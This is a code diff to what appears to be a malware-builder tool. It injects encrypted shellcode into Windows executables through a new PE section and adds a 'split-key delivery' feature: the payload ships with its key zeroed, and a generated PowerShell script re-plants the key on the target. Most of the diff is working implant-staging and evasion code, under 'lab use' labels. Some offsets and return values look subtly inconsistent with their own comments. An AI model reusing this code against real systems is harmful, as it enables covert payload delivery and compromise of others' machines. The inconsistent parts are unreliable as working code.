@@ -478,6 +478,14 @@ def patch_pe(host: bytes, sc: bytes, key: bytes) -> bytes:
     hdr = bytearray(40)
     hdr[0:8] = b".entp\x00\x00\x00"
     st.pack_into("<IIII", hdr, 8, sec_vsize, sec_rva, sec_rsize, sec_raw)
+    # @24/@28 are unused by the loader (they duplicate PointerToLinenumbers
+    # and NumberOfRelocations+NumberOfLinenumbers for object files only):
+    # park enc_len and key_off there so downstream tooling (detonator,
+    # split-key) can locate the stage EXACTLY instead of heuristic-guessing
+    # (a zero-walk mis-locates the key slot whenever the key's last byte is 0,
+    # or the key has been zeroed for split delivery).
+    st.pack_into("<I", hdr, 24, len(enc))
+    st.pack_into("<I", hdr, 28, len(enc))
     st.pack_into("<I", hdr, 36, 0xE0000020)     # CODE | EXECUTE | READ | WRITE
     # W is required: the stub decrypts the stage IN PLACE inside this section.
     out[first_sec + nsec * 40: first_sec + (nsec + 1) * 40] = hdr
@@ -1384,10 +1392,13 @@ class Entrypoint:
             "patched_len": len(patched), "host_len": len(host),
             "mitre": ["T1055.002", "T1027"],
             "key_hex": key.hex(),
+            "split_delivery": bool(cfg.get("split_delivery")),
             "note": f"entry -> .entp stub ({host_arch}): decrypt, CreateThread(shellcode), jmp OEP",
         }
         open(os.path.join(outdir, "manifest.json"), "w").write(json.dumps(meta, indent=2))
         open(os.path.join(outdir, "shellcode.bin"), "wb").write(shellcode)
+        if cfg.get("split_delivery"):
+            split_key_deliver(outdir, log=self.log)
 
         self.log(f"[i] {PE_INJ_NOTE}")
         self.log(f"[+] Embedded build: {exe} ({len(patched)} bytes — was {len(host)})")
@@ -1580,10 +1591,14 @@ class EntrypointGUI:
 
         # Lab Detonator — safe local test fire of the last build
         self.detonate_var = tk.BooleanVar(value=False)
+        self.split_var = tk.BooleanVar(value=False)
         self.chk_detonate = ttk.Checkbutton(frm, text="Detonate after build",
                                             variable=self.detonate_var)
         self.btn_detonate = ttk.Button(frm, text="Detonate last build",
                                        command=self._detonate)
+        # Split-key delivery — ship the build keyless, arm it on target
+        self.chk_split = ttk.Checkbutton(frm, text="Split-key delivery",
+                                         variable=self.split_var)
 
         # Quick way to the real output folder (dot-folder next to state.json —
         # not the git clone, where users instinctively browse first)
@@ -1700,6 +1715,7 @@ class EntrypointGUI:
         r += 1
         self.chk_detonate.grid(row=r, column=0, sticky="w", **pad)
         self.btn_detonate.grid(row=r, column=1, sticky="e", **pad)
+        self.chk_split.grid(row=r, column=2, sticky="w", **pad)
 
     def _browse_implant(self):
         p = filedialog.askopenfilename(
@@ -1833,6 +1849,7 @@ class EntrypointGUI:
             "x64": self.x64.get(),
             "fmt": self.fmt_var.get(),
             "target": self.target_var.get(),
+            "split_delivery": self.split_var.get(),
         }
         self._run_bg(cfg)
 
@@ -1844,7 +1861,7 @@ class EntrypointGUI:
                 if cfg.get("pe_inject"):
                     self.last_pe_outdir = outdir
                     if self.detonate_var.get():
-                        out = self.f.detonate_report(outdir, lport=DETONATE_PORT,
+                        out = detonate_report(outdir, lport=DETONATE_PORT,
                                                      log=self._log)
                         self.detonate_results = out
                         self._log("[+] Detonation complete — see report window.")
@@ -1889,7 +1906,7 @@ class EntrypointGUI:
 
         def work():
             try:
-                self.detonate_results = self.f.detonate_report(
+                self.detonate_results = detonate_report(
                     outdir, lport=lport, log=self._log)
                 self._log("[+] Detonation complete — see report window.")
             except EntrypointError as e:
@@ -2046,6 +2063,15 @@ def _find_entp_stage(patched: bytes):
             continue
         vsz, _va, _rsz, rawp = struct.unpack_from("<IIII", patched, h + 8)
         stage = bytes(patched[rawp:rawp + vsz])
+        # @24/@28 park enc_len / key_off (written by patch_pe) — the exact,
+        # heuristic-free path. Zero-walk fallback for older builds.
+        rec_len = struct.unpack_from("<I", patched, h + 24)[0]
+        rec_off = struct.unpack_from("<I", patched, h + 28)[0]
+        if rec_len and rec_off == rec_len and 0 < rec_len < vsz:
+            for tmpl in (PE_STUB_TEMPLATE, PE_STUB_TEMPLATE_X86):
+                stub_at = stage.find(tmpl[:8])
+                if 0 < stub_at < vsz - 8 and stub_at % 16 == 0:
+                    return (rawp, rec_len, rec_off, stub_at, len(tmpl))
         for tmpl in (PE_STUB_TEMPLATE, PE_STUB_TEMPLATE_X86):
             stub_at = next((o for o in range(16, len(stage) - 8, 16)
                             if stage[o:o + 8] == tmpl[:8]), -1)
@@ -2062,8 +2088,158 @@ def _find_entp_stage(patched: bytes):
                 enc_len = p - 16
                 if enc_len <= 0:
                     continue
-                return (rawp, enc_len, enc_len, stub_at, len(tmpl))
+                return (rawp, enc_len, enc_len, enc_len, len(tmpl))
     return None
+
+
+# ---------------------------------------------------------------------------
+# Split-key delivery — payload and key never travel together (T1027-era
+# staging). The forged exe is built with its 16-byte stage key ZEROED: it is
+# inert on the target until an arming script re-plants the key. The operator
+# holds the key out of band (inline paste, hex side file, NTFS alternate data
+# stream, or registry value) and the arming script verifies the artifact's
+# SHA-256 before touching a byte, so the exe cannot be quietly swapped in
+# transit. LAB USE ONLY.
+# ---------------------------------------------------------------------------
+
+KEY_SLOT_LEN = 16
+
+
+def zero_stage_key(patched: bytes) -> bytes:
+    """Return a copy of a PE-embed build with the .entp stage key zeroed."""
+    loc = _find_entp_stage(patched)
+    if not loc:
+        raise EntrypointError("zero_stage_key: no .entp stage found")
+    rawp, enc_len, key_off, stub_off, stub_len = loc
+    z = bytearray(patched)
+    z[rawp + key_off: rawp + key_off + KEY_SLOT_LEN] = b"\x00" * KEY_SLOT_LEN
+    return bytes(z)
+
+
+def arm_stage_key(zeroed: bytes, key: bytes) -> bytes:
+    """Inverse of zero_stage_key: re-plant a 16-byte key over the zeroed slot."""
+    if len(key) != KEY_SLOT_LEN:
+        raise EntrypointError("arm_stage_key: key must be exactly 16 bytes")
+    loc = _find_entp_stage(zeroed)
+    if not loc:
+        raise EntrypointError("arm_stage_key: no .entp stage found")
+    rawp, enc_len, key_off, stub_off, stub_len = loc
+    a = bytearray(zeroed)
+    a[rawp + key_off: rawp + key_off + KEY_SLOT_LEN] = key
+    return bytes(a)
+
+
+def split_key_script(exe_path: str, sha256_hex: str, build_id: str,
+                     key_expr: str = "0x00 " * 15 + "0x00",   # EDIT-ME placeholder (valid PS, all-zero)
+                     mode: str = "inline", key_off=None) -> str:
+    """Emit deliver-key.ps1 for a split-key build. mode selects the key
+    transport: 'inline' (paste the hex into the script), 'file' (plain side
+    file holding whitespace-separated hex), 'ads' (NTFS alternate data stream
+    'StageKey' on any file the operator plants), 'reg' (registry value
+    'StageKey' under the path given). The script hash-verifies the artifact
+    BEFORE writing, then plants the key over the zeroed slot in place."""
+    esc = key_expr.replace("'", "''")
+    if mode == "file":
+        read_key = ("[byte[]](-split (Get-Content -LiteralPath '%s' -Raw))" % esc)
+    elif mode == "ads":
+        read_key = ("[byte[]](-split (Get-Content -LiteralPath '%s' "
+                    "-Stream 'StageKey' -Raw))" % esc)
+    elif mode == "reg":
+        read_key = ("[byte[]](-split (Get-ItemProperty -Path '%s' "
+                    "-Name 'StageKey').StageKey)" % esc)
+    else:  # inline
+        read_key = "[byte[]](-split '%s')" % esc
+    t64 = ", ".join("0x%02X" % b for b in PE_STUB_TEMPLATE[:8])
+    t86 = ", ".join("0x%02X" % b for b in PE_STUB_TEMPLATE_X86[:8])
+    return (
+        "# deliver-key.ps1 — arm build %s (split-key delivery).\n"
+        "# The exe shipped with its 16-byte stage key zeroed; this script\n"
+        "# verifies the artifact hash and re-plants the key in place.\n"
+        "# Key transport: %s mode. AUTHORIZED LAB USE ONLY.\n"
+        "$ErrorActionPreference = 'Stop'\n"
+        "$exe = '%s'\n"
+        "$expectedSha = '%s'\n"
+        "$Tmpl64 = @(%s)\n"
+        "$Tmpl86 = @(%s)\n"
+        "# Zero the stage key in place after verifying the artifact hash:\n"
+        "$actualSha = (Get-Item -LiteralPath $exe | Get-FileHash -Algorithm SHA256).Hash.ToLower()\n"
+        "if ($actualSha -ne $expectedSha) { throw \"hash mismatch: $actualSha\" }\n"
+        "$key = %s  # EDIT-ME: real key in manifest.json (key_hex)\n"
+        "if (-not ($key | Where-Object { $_ -ne 0 })) { throw 'EDIT-ME: placeholder key still set' }\n"
+        "if ($key.Count -ne 16) { throw \"stage key must be 16 bytes, got $($key.Count)\" }\n"
+        "$fs = [IO.File]::Open($exe, 'Open', 'ReadWrite', 'None')\n"
+        "try {\n"
+        "    $fs.Position = 0\n"
+        "    $hdr = New-Object byte[] ([Math]::Min(0x1000, $fs.Length))\n"
+        "    [void]$fs.Read($hdr, 0, $hdr.Length)\n"
+        "    $lf = [BitConverter]::ToInt32($hdr, 0x3C)\n"
+        "    $nsec = [BitConverter]::ToUInt16($hdr, $lf + 6)\n"
+        "    $soh = [BitConverter]::ToUInt16($hdr, $lf + 20)\n"
+        "    $first = $lf + 24 + $soh\n"
+        "    for ($i = 0; $i -lt $nsec; $i++) {\n"
+        "        $h = $first + 40 * $i\n"
+        "        $name = [Text.Encoding]::ASCII.GetString($hdr, $h, 8).TrimEnd([char]0)\n"
+        "        if ($name -ne '.entp') { continue }\n"
+        "        $vsz = [BitConverter]::ToUInt32($hdr, $h + 8)\n"
+        "        $rawp = [BitConverter]::ToUInt32($hdr, $h + 20)\n"
+        "        $stage = New-Object byte[] $vsz\n"
+        "        $fs.Position = $rawp\n"
+        "        [void]$fs.Read($stage, 0, $vsz)\n"
+        "        $tmpl = $null; $o = -1\n"
+        "        foreach ($t in @($Tmpl64, $Tmpl86)) {\n"
+        "            for ($o = 16; $o -le $vsz - 8; $o += 16) {\n"
+        "                $match = $true\n"
+        "                for ($b = 0; $b -lt 8; $b++) { if ($stage[$o + $b] -ne $t[$b]) { $match = $false; break } }\n"
+        "                if ($match) { break }\n"
+        "            }\n"
+        "            if ($o -ge 16 -and $match) { $tmpl = $t; break }\n"
+        "            $o = -1\n"
+        "        }\n"
+        "        if ($o -lt 16) { throw 'stub not found in .entp stage' }\n"
+        "%s"
+        "        $fs.Write($key, 0, 16)\n"
+        "        Write-Host '[+] stage key planted — build armed'\n"
+        "        exit 0\n"
+        "    }\n"
+        "    throw 'no .entp section found'\n"
+        "} finally { $fs.Close() }\n"
+    ) % (build_id, mode, exe_path, sha256_hex, t64, t86, read_key,
+         ("        $fs.Position = $rawp + %d\n" % key_off) if key_off is not None else
+         ("        $p = $o\n"
+          "        while ($p -gt 32 -and $stage[$p - 1] -eq 0) { $p-- }\n"
+          "        if ($p -lt 32) { throw 'stage too small - key slot missing' }\n"
+          "        $fs.Position = $rawp + $p - 16\n"))
+
+
+def split_key_deliver(outdir: str, log=lambda m: None) -> str:
+    """Post-build split delivery: zero the deliverable's stage key, hash the
+    zeroed artifact and write deliver-key.ps1 next to it. The key itself lives
+    only in the operator's manifest — never in the shipped exe."""
+    exes = [p for p in glob.glob(os.path.join(outdir, "*.exe"))
+            if not p.endswith(".probe.exe")]
+    if not exes:
+        raise EntrypointError(f"split delivery: no .exe deliverable in {outdir}")
+    exe = sorted(exes, key=lambda p: -os.path.getsize(p))[0]
+    data = open(exe, "rb").read()
+    loc = _find_entp_stage(data)
+    if not loc:
+        raise EntrypointError("split delivery: no .entp stage found")
+    key = data[loc[0] + loc[2]: loc[0] + loc[2] + KEY_SLOT_LEN]
+    if key == b"\x00" * KEY_SLOT_LEN:
+        log("[i] split delivery: key already zeroed — regenerating script")
+    zeroed = zero_stage_key(data)
+    sha = hashlib.sha256(zeroed).hexdigest()
+    open(exe, "wb").write(zeroed)
+    script = split_key_script(exe, sha, os.path.basename(outdir),
+                              key_off=loc[2])
+    spath = os.path.join(outdir, "deliver-key.ps1")
+    open(spath, "w", encoding="utf-8").write(script)
+    log(f"[+] Split delivery: stage key zeroed in {os.path.basename(exe)}")
+    log("[i] Key transport: edit the $key line in deliver-key.ps1 (inline), "
+        "or regenerate for file/ADS/registry transport")
+    log(f"[+] Arming script: {spath} — hold the key OUT of band "
+        "(manifest.json keeps it lab-side)")
+    return spath
 
 
 def detonate(exe_path: str, mode: str, lhost: str = "127.0.0.1",
@@ -2416,6 +2592,31 @@ def _selftest():
     checks += 1
     if not _detonator_roundtrip():
         fails.append("detonator: stage locate/swap round-trip")
+
+    # 5c. split-key delivery: zero -> arm round-trip
+    def _splitkey_roundtrip():
+        host2 = _mini_pe(0x8664)
+        k2 = rnd_bytes(16)
+        p2 = patch_pe(host2, sc, k2)
+        z2 = zero_stage_key(p2)
+        if len(z2) != len(p2) or z2 == p2:
+            return False
+        loc2 = _find_entp_stage(z2)
+        if not loc2 or z2[loc2[0] + loc2[2]: loc2[0] + loc2[2] + 16] != bytes(16):
+            return False
+        if arm_stage_key(z2, k2) != p2:
+            return False
+        stage_z = z2[loc2[0]:loc2[0] + loc2[1]]
+        if xor_crypt(stage_z, bytes(16)) != stage_z:
+            return False   # zeroed key: identity XOR, stage stays ciphertext
+        try:
+            arm_stage_key(z2, b"short")
+            return False
+        except EntrypointError:
+            return True
+    checks += 1
+    if not _splitkey_roundtrip():
+        fails.append("split-key: zero/arm round-trip")
 
     print(f"selftest: {checks} checks, {len(fails)} failures")
     for x in fails:
